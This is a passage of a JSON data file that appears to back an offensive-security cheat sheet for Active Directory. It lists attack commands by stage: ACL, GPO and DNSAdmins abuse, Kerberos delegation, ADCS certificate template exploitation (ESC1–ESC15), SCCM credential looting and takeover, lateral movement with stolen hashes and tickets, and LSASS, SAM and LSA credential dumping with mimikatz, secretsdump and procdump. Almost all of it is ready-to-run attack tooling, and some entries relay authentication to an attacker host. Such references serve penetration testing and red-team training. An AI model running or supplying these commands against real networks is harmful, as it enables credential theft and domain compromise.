                  "ForceChangePassword",
                  "net user <user> <password> /domain` >>> User with clear text pass"
                ]
              }
            ]
          },
          {
            "desc": "On OU",
            "entries": [
              {
                "subdesc": "WriteDACL on OU = ACE inheritance to all child objects",
                "cmd": [
                  "Write Dacl",
                  "ACE Inheritance",
                  "Grant rights",
                  "GenericAll / GenericWrite / Manage Group Policy Links",
                  "OUned.py --config config.ini"
                ]
              }
            ]
          },
          {
            "desc": "ReadGMSAPassword",
            "entries": [
              {
                "subdesc": "gMSA accounts often have high privileges — extract their NTLM hash",
                "cmd": [
                  "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>",
                  "nxc ldap <ip> -u <user> -p <pass> --gmsa",
                  "ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa"
                ]
              }
            ]
          },
          {
            "desc": "Get LAPS passwords",
            "entries": [
              {
                "subdesc": "LAPS stores local admin passwords in AD — check who has read permissions",
                "cmd": [
                  "Who can read LAPS",
                  "MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p",
                  "Read LAPS >>> Admin",
                  "Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize",
                  "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps",
                  "foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}",
                  "nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps",
                  "msf> use post/windows/gather/credentials/enum_laps"
                ]
              }
            ]
          },
          {
            "desc": "GPO",
            "entries": [
              {
                "subdesc": "GPO control = code execution on all linked OUs. Check who can create/edit GPOs",
                "cmd": [
                  "Who can control GPOs",
                  "MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p",
                  "SID of principals that can create new GPOs in the domain",
                  "Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=blah,DC=com\" -ResolveGUIDs  | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl",
                  "Return the principals that can write to the GP-Link attribute on OUs",
                  "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl",
                  "Generic Write on  GPO",
                  "Abuse GPO >>> ACCESS"
                ]
              }
            ]
          },
          {
            "desc": "DNS Admin",
            "entries": [
              {
                "subdesc": "DNSAdmins group can load arbitrary DLLs on the DC via serverlevelplugindll",
                "cmd": [
                  "DNSadmins abuse (CVE-2021-40469) @CVE@ >>> Admin",
                  "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll> # need a dnsadmin user",
                  "sc \\\\DNSServer stop dns sc \\\\DNSServer start dns"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__delegation",
        "name": "Kerberos Delegation",
        "description": "Abuse unconstrained, constrained, and resource-based constrained delegation (RBCD) to impersonate high-privilege users.",
        "commands": [
          {
            "desc": "Find delegation",
            "entries": [
              {
                "subdesc": "Map all delegation types — unconstrained is highest priority (TGT theft)",
                "cmd": [
                  "findDelegation.py \"<domain>\"/\"<user>\":\"<password>",
                  "With BloodHound",
                  "Unconstrained",
                  "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c",
                  "MATCH (c:User {unconstraineddelegation:true}) RETURN c",
                  "Constrained",
                  "MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p",
                  "MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: \"<MYTARGET.FQDN>\"})) RETURN p"
                ]
              }
            ]
          },
          {
            "desc": "Unconstrained delegation",
            "entries": [
              {
                "subdesc": "Kerberos TGT >>> PassTheTicket",
                "cmd": [
                  "UAC: ADS_UF_TRUSTED_FOR_DELEGATION",
                  "Force connection  with coerce",
                  "Get tickets",
                  "mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export",
                  "Rubeus.exe dump /service:krbtgt /nowrap",
                  "Rubeus.exe dump /luid:0xdeadbeef /nowrap",
                  "Rubeus.exe monitor /interval:5"
                ]
              }
            ]
          },
          {
            "desc": "Constrained delegation",
            "entries": [
              {
                "subdesc": "Exploit S4U2Self/S4U2Proxy to impersonate privileged users for target services",
                "cmd": [
                  "With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION",
                  "Get TGT for user",
                  "Request S4u2self",
                  "Request S4u2proxy",
                  "Rubeus.exe hash /password:<password>",
                  "Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>",
                  "Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt",
                  "Altservice HTTP/HOST/CIFS/LDAP  >>> Kerberos TGS",
                  "getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>",
                  "Altservice HTTP/HOST/CIFS/LDAP >>> Kerberos TGS",
                  "Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION",
                  "Constrain between Y and Z",
                  "Add computer X",
                  "Add RBCD : delegate from X to Y",
                  "s4u2self X (impersonate admin)",
                  "S4u2Proxy X (impersonate admin on spn/Y)",
                  "Forwardable TGS for Y",
                  "S4u2Proxy Y (impersonate admin on spn/Z)",
                  "add computer account",
                  "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>",
                  "RBCD With added computer account >>> Kerberos TGS",
                  "rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$",
                  "getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>",
                  "getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>",
                  "Self RBCD @CVE@",
                  "Like RBCD without add computer"
                ]
              }
            ]
          },
          {
            "desc": "Resource-Based Constrained Delegation",
            "entries": [
              {
                "subdesc": "Requires GenericWrite on target computer — create fake machine account then delegate",
                "cmd": [
                  "add computer account",
                  "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>",
                  "RBCD With added computer account",
                  "Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>",
                  "Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt` >>> Admin",
                  "rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>",
                  "getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>` >>> Kerberos TGT >>> Admin"
                ]
              }
            ]
          },
          {
            "desc": "S4U2self abuse",
            "entries": [
              {
                "subdesc": "Obtain service ticket as admin on a machine you already control",
                "cmd": [
                  "Get machine account (X)'s TGT",
                  "Get a ST on X as user admin",
                  "getTGT.py -dc-ip \"<dc_ip>\" -hashes :\"<machine_hash>\" \"<domain>\"/\"<machine>$",
                  "getST.py -self -impersonate \"<admin>\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>\"/'<machine>$'` >>> Admin"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__adcs",
        "name": "ADCS",
        "description": "Exploit Active Directory Certificate Services misconfigurations — ESC1-ESC8 template abuse, certificate theft, and NTLM relay to ADCS. Key tools: certipy (pip install certipy-ad), Certify.exe (from GhostPack).",
        "commands": [
          {
            "desc": "Enumeration",
            "entries": [
              {
                "subdesc": "Web enrollement || Vulnerable template || Vulnerable CA || Misconfigured ACL || Vulnerable PKI Object AC",
                "cmd": [
                  "certutil -v -dsTemplate",
                  "certify.exe find [ /vulnerable]",
                  "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>",
                  "ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates",
                  "Get PKI objects information",
                  "certify.exe pkiobjects",
                  "Display CA information",
                  "certutil -TCAInfo",
                  "certify.exe cas"
                ]
              }
            ]
          },
          {
            "desc": "Web Enrollment Is Up",
            "entries": [
              {
                "subdesc": "Domain admin",
                "cmd": [
                  "ESC8 >>> Pass the ticket >>> DCSYNC || LDAP shell",
                  "ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController",
                  "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
                  "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
                  "certipy relay -target http://<ip_ca>",
                  "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Misconfigured Certificate Template",
            "entries": [
              {
                "subdesc": "ESC1-3, ESC13, ESC15 — request certs as other users via template misconfig",
                "cmd": [
                  "ESC1 >>> Pass the certificate",
                  "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>",
                  "certify.exe request /ca:<server>\\<ca-name>   /template:\"<vulnerable template name>\" [/altname:\"Admin\"]",
                  "ESC2 >>> ESC3",
                  "ESC3",
                  "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>",
                  "certify.exe request request /ca:<server>\\<ca-name> /template:<template>  /onbehalfof:<domain>\\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]",
                  "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name>",
                  "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template  '<vulnerable template name>'  -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>",
                  "ESC13 >>> Pass The Certificate (PKINIT)",
                  "certipy req -u <user>@<domain> -p <password> -target <ca_server>  -template '<vulnerable template name>' -ca <ca_name>",
                  "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>",
                  "ESC15",
                  "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]` >>> Pass the certificate (only Schannel)",
                  "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]` >>> Pass the certificate",
                  "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>"
                ]
              }
            ]
          },
          {
            "desc": "Misconfigured ACL",
            "entries": [
              {
                "subdesc": "ESC4 (template write) and ESC7 (CA officer) — modify templates to create ESC1 conditions",
                "cmd": [
                  "ESC4",
                  "write privilege over a certificate template",
                  "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug` >>> ESC1",
                  "restore template",
                  "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json",
                  "ESC7",
                  "Manage CA",
                  "certipy ca -ca <ca_name> -add-officer  '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>` >>> ESC7 Manage certificate",
                  "Manage certificate",
                  "certipy ca  -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>",
                  "certipy  req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>",
                  "error, but save private key and get issue request",
                  "Issue request",
                  "certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>",
                  "certipy req -u <user>@<domain> -p '<password>'  -ca <ca_name> -retreive <request_id>` >>> Pass the certificate"
                ]
              }
            ]
          },
          {
            "desc": "Vulnerable PKI Object access control",
            "entries": [
              {
                "subdesc": "ESC5 — vulnerable ACLs on PKI objects. Golden certificate = forge any cert",
                "cmd": [
                  "ESC5",
                  "Vulnerable acl on PKI >>> ACL",
                  "Golden certificate",
                  "certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>",
                  "certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>` >>> Pass the certificate"
                ]
              }
            ]
          },
          {
            "desc": "Misconfigured Certificate Authority",
            "entries": [
              {
                "subdesc": "ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) and ESC11 (RPC relay to CA)",
                "cmd": [
                  "ESC6 @CVE@ >>> ESC1",
                  "Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication",
                  "ESC11 >>> Pass the ticket >>> DCSYNC >>> Domain Admin",
                  "ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>",
                  "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
                  "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
                  "certipy relay -target rpc://<ip_ca> -ca '<ca_name>",
                  "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Abuse Certificate Mapping",
            "entries": [
              {
                "subdesc": "ESC9/ESC10/ESC14 — abuse UPN mapping to impersonate other users via certificates",
                "cmd": [
                  "ESC9/ESC10 (implicit)",
                  "certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>",
                  "ESC9/ESC10 (Case 1)",
                  "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator` >>> reset accountB UPN",
                  "ESC9",
                  "certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>",
                  "ESC10 (case 1)",
                  "certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>",
                  "ESC10 (Case 2)",
                  "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'` >>> ESC10  Case1",
                  "reset accountB UPN",
                  "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>` >>> Pass The Certificate",
                  "[Kerberos Mapping] ESC9/ESC10(Case 1)",
                  "[Schannel Mapping] ESC9/ESC10 (Case 2)",
                  "ESC14 (explicit)"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__sccm",
        "name": "SCCM",
        "description": "Exploit System Center Configuration Manager — NAA credential extraction, PXE abuse, task sequence secrets, and lateral movement via client push.",
        "commands": [
          {
            "desc": "recon",
            "entries": [
              {
                "subdesc": "Discover SCCM infrastructure — management points, distribution points, and site servers",
                "cmd": [
                  "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
                  "sccmhunter.py show -all",
                  "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
                  "nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares"
                ]
              }
            ]
          },
          {
            "desc": "Creds-1 No credentials",
            "entries": [
              {
                "subdesc": "NAA credentials || User + Pass",
                "cmd": [
                  "Extract from pxe See no creds >>> PXE"
                ]
              }
            ]
          },
          {
            "desc": "Elevate-1:Relay on site systems Simple user",
            "entries": [
              {
                "subdesc": "Admin on Site system",
                "cmd": [
                  "coerce sccm site server",
                  "ntlmrelayx.py -tf <site_systems> -smb2support"
                ]
              }
            ]
          },
          {
            "desc": "Elevate-2:Force client push Simple user",
            "entries": [
              {
                "subdesc": "Admin",
                "cmd": [
                  "ntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connection",
                  "SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install",
                  "proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>",
                  "cleanup"
                ]
              }
            ]
          },
          {
            "desc": "Elevate-3:Automatic client push Simple user",
            "entries": [
              {
                "subdesc": "Relay ntlm",
                "cmd": [
                  "Create DNS A record for non existing computer x",
                  "dnstool.py -u '<domain>\\<user>' -p <pass>  -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>",
                  "Enroll new computer x in AD  then remove host SPN from the machine account",
                  "setspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>",
                  "wait 5m for client push",
                  "ntlmrelayx.py -tf <no_signing_target> -smb2support -socks",
                  "cleanup"
                ]
              }
            ]
          },
          {
            "desc": "CRED-6 Loot creds",
            "entries": [
              {
                "subdesc": "User + Pass",
                "cmd": [
                  "SCCM SMB service (445/TCP) on a DP",
                  "cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt",
                  "SCCM HTTP service (80/TCP or 443/TCP) on a DP",
                  "SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>",
                  "SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>",
                  "sccm-http-looter -server <ip_dp>"
                ]
              }
            ]
          },
          {
            "desc": "Takeover-1:relay to mssql db Simple user",
            "entries": [
              {
                "subdesc": "SCCM ADMIN",
                "cmd": [
                  "SCCM MSSQL != SSCM server",
                  "sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked",
                  "ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q \"<query>",
                  "coerce sccm_mssql -> attacker",
                  "sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Takeover-2:relay to mssql server Simple user",
            "entries": [
              {
                "subdesc": "Admin MSSQL",
                "cmd": [
                  "SCCM MSSQL != SSCM server",
                  "ntlmrelayx.py -t <sccm_mssql> -smb2support -socks",
                  "coerce sccm_server",
                  "proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Creds-2:Policy Request Credentials Simple user",
            "entries": [
              {
                "subdesc": "User + Pass",
                "cmd": [
                  "add computer",
                  "sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\\<computer_added>$' '<computer_pass>",
                  "get NetworkAccessUsername and NetworkAccessPassword",
                  "policysecretunobfuscate.py",
                  "delete device created after sccmadmin",
                  "SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>",
                  "cleanup"
                ]
              }
            ]
          },
          {
            "desc": "Creds-3Creds-4 Computer Admin user",
            "entries": [
              {
                "subdesc": "NAA credentials",
                "cmd": [
                  "dploot.py sccm -u <admin> -p '<password>' <sccm_target>",
                  "sccmhunter.py dpapi  -u <admin> -p '<password>' -target <sccm_target> -debug",
                  "SharpSCCM.exe local secrets -m disk",
                  "SharpSCCM.exe local secrets -m wmi"
                ]
              }
            ]
          },
          {
            "desc": "Creds-5 SCCM admin",
            "entries": [
              {
                "subdesc": "Site DB credentials",
                "cmd": [
                  "secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>",
                  "mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>",
                  "use CM_<site_code>;",
                  "SELECT * FROM SC_UserAccount;",
                  "sccmdecryptpoc.exe <cyphered_value>"
                ]
              }
            ]
          },
          {
            "desc": "EXEC-1/2 SCCM admin",
            "entries": [
              {
                "subdesc": "lat",
                "cmd": [
                  "SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner",
                  "sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>",
                  "get_device <hostname>",
                  "interact <device_id>",
                  "script xploit.ps1"
                ]
              }
            ]
          },
          {
            "desc": "Cleanup",
            "entries": [
              {
                "subdesc": "Remove SCCM artifacts created during exploitation",
                "cmd": [
                  "SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p \"Name\" -p \"ResourceId\" -p \"SMSUniqueIdentifier",
                  "SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>"
                ]
              }
            ]
          },
          {
            "desc": "Post exploit",
            "entries": [
              {
                "subdesc": "Extract user session data from SCCM after gaining admin access",
                "cmd": [
                  "as sccm admin",
                  "SCCMHound.exe --server <server> --sitecode <sitecode>` >>> Users sessions"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__lat_move",
        "name": "Lateral Movement",
        "description": "Move between hosts using pass-the-hash, pass-the-ticket, overpass-the-hash, WMI, WinRM, PsExec, DCOM, and RDP with stolen credentials.",
        "commands": [
          {
            "desc": "Clear text Password",
            "entries": [
              {
                "subdesc": "Admin",
                "cmd": [
                  "Interactive-shell - psexec >>> Authority/System",
                  "psexec.py <domain>/<user>:<password>@<ip>",
                  "psexec.exe -AcceptEULA \\\\<ip>",
                  "psexecsvc.py <domain>/<user>:<password>@<ip>",
                  "Pseudo-shell (file write and read)",
                  "atexec.py  <domain>/<user>:<password>@<ip> \"command",
                  "smbexec.py  <domain>/<user>:<password>@<ip>",
                  "wmiexec.py  <domain>/<user>:<password>@<ip>",
                  "dcomexec.py  <domain>/<user>:<password>@<ip>",
                  "nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>",
                  "WinRM >>> Low access || Admin",
                  "evil-winrm -i <ip> -u <user> -p <password>",
                  "Enter-PSSession -ComputerName <computer> -Credential <domain>\\<user>",
                  "nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>",
                  "RDP >>> Low access || Admin",
                  "xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>",
                  "SMB >>> Search files",
                  "smbclient.py <domain>/<user>:<password>@<ip>",
                  "smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>",
                  "MSSQL >>> MSSQL",
                  "nxc mssql <ip_range> -u <user> -p <password>",
                  "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
                ]
              }
            ]
          },
          {
            "desc": "NT Hash",
            "entries": [
              {
                "subdesc": "NTLM hashes never expire and are not salted — reusable across sessions",
                "cmd": [
                  "Pass the Hash",
                  "MSSQL/PseudoShell PsExec/SMB...  >>> Admin",
                  "impacket : same as with creds, but use -hashes ':<hash>",
                  "nxc : same as with creds, but use -H ':<hash>",
                  "mimikatz \"privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>\"` >>> Admin",
                  "RDP >>> Low access || Admin",
                  "reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0",
                  "xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>",
                  "WinRM >>> Low access || Admin",
                  "evil-winrm -i <ip> -u <user> -H <hash>",
                  "Overpass the Hash / Pass the key (PTK) >>> Admin",
                  "Rubeus.exe asktgt /user:victim /rc4:<rc4value>",
                  "Rubeus.exe ptt /ticket:<ticket>",
                  "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\[cmd.exe||upnpcont.exe]",
                  "getTGT.py <domain>/<user> -hashes :<hashes>"
                ]
              }
            ]
          },
          {
            "desc": "Kerberos",
            "entries": [
              {
                "subdesc": "Pass-the-Ticket with ccache/kirbi files — convert between formats as needed",
                "cmd": [
                  "Pass the Ticket (ccache / kirbi)",
                  "Convert Format",
                  "ticketConverter.py <kirbi||ccache> <ccache||kirbi>",
                  "export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache` >>> Admin",
                  "impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket",
                  "mimikatz kerberos::ptc \"<ticket>",
                  "Rubeus.exe ptt /ticket:<ticket>",
                  "proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>",
                  "Modify SPN >>> PassTheTicket",
                  "tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice \"<service>/<target>\" #pr 1256",
                  "Aeskey >>> Admin",
                  "impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)",
                  "proxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>"
                ]
              }
            ]
          },
          {
            "desc": "Socks (relay)",
            "entries": [
              {
                "subdesc": "Use proxychains with ntlmrelayx socks to pivot through relayed sessions",
                "cmd": [
                  "proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids",
                  "proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass` >>> MSSQL",
                  "proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'` >>> DCSYNC",
                  "proxychains smbclient.py -no-pass <user>@<ip>` >>> Search files",
                  "proxychains atexec.py  -no-pass  <domain>/<user>@<ip> \"command\"` >>> Authority/System",
                  "proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>` >>> Authority/System"
                ]
              }
            ]
          },
          {
            "desc": "Certificate (pfx)",
            "entries": [
              {
                "subdesc": "Use stolen certificate for pass-the-cert authentication or LDAP shell access",
                "cmd": [
                  "unpac the hash",
                  "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
                  "gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> \"<domain>/<dc_name>\" <tgt.ccache>",
                  "getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>",
                  "Pass the certificate",
                  "pkinit",
                  "gettgtpkinit.py -cert-pfx \"<pfx_file>\" ^[-pfx-pass  \"<cert-password>\"] \"<fqdn_domain>/<user>\" \"<tgt_ccache_file>",
                  "Rubeus.exe asktgt /user:\"<username>\" /certificate:\"<pfx_file>\" [/password:\"<certificate_password>\"] /domain:\"<fqdn-domain>\" /dc:\"<dc>\" /show",
                  "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
                  "schannel",
                  "certipy auth -pfx <pfx_file> -ldap-shell",
                  "add_computer",
                  "Set RBCD >>> RBCD",
                  "certipy cert -pfx \"<pfx_file>\" -nokey -out \"user.crt",
                  "certipy cert -pfx \"<pfx_file>\" -nocert -out \"user.key",
                  "passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "MSSQL",
            "entries": [
              {
                "subdesc": "Check for xp_cmdshell, impersonation, and linked servers for lateral movement",
                "cmd": [
                  "find mssql access",
                  "nxc mssql <ip> -u <user> -p <password> -d <domain>` >>> MSSQL",
                  "Users or Computers with SQL admin",
                  "MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p` >>> MSSQL",
                  "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>",
                  "enum_db",
                  "enable_xp_cmdshell",
                  "xp_cmdshell <cmd>` >>> Low Access",
                  "enum_impersonate",
                  "exec_as_user <user>` >>> MSSQL",
                  "exec_as_login <login>` >>> MSSQL",
                  "xp_dir_tree <ip>` >>> COERCE SMB",
                  "trustlink",
                  "sp_linkedservers",
                  "use_link` >>> MSSQL || Trust"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__admin",
        "name": "Admin Access",
        "description": "Post-admin enumeration and credential extraction — DCSync, LSASS dump, SAM/SYSTEM extraction, DPAPI secrets, and cached credentials. Key pip installs: lsassy, donpapi, dploot, masky, keepwn.",
        "commands": [
          {
            "desc": "Extract credentials from LSASS.exe",
            "entries": [
              {
                "subdesc": "Primary credential extraction — yields plaintext passwords, NTLM hashes, and Kerberos tickets",
                "cmd": [
                  "LSASS as protected process",
                  "PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update",
                  "mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\"  \"sekurlsa::logonpasswords\" \"!processprotect  /process:lsass.exe\" \"!-",
                  "Extract LSASS secrets  >>> User + Pass || NTLM || PassTheHash || Clear text move",
                  "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
                  "mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\"  \"exit",
                  "msf> load kiwi creds_all",
                  "nxc smb <ip_range> -u <user> -p <password> -M lsassy",
                  "lsassy -d <domain> -u <user> -p <password> <ip>"
                ]
              }
            ]
          },
          {
            "desc": "Extract credentials from SAM",
            "entries": [
              {
                "subdesc": "NTLM || PassTheHash",
                "cmd": [
                  "nxc smb <ip_range> -u <user> -p <password> --sam",
                  "msf> hashdump",
                  "mimikatz \"privilege::debug\" \"lsadump::sam\" \"exit",
                  "secretsdump.py <domain>/<user>:<password>@<ip>",
                  "reg save HKLM\\SAM <file>;  reg save HKLM\\SYSTEM <file>",
                  "secretsdump.py -system SYSTEM -sam SAM LOCAL",
                  "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share",
                  "secretsdump.py -system SYSTEM -sam SAM LOCAL",
                  "regsecrets.py <domain>/<user>:<password>@<ip>"
                ]
              }
            ]
          },
          {
            "desc": "Extract credentials from LSA",
            "entries": [
              {
                "subdesc": "MsCache 2 || User + Pass",
                "cmd": [
                  "nxc smb <ip_range> -u <user> -p <password> --lsa",
                  "mimikatz \"privilege::debug\" \"lsadump::lsa\" \"exit",
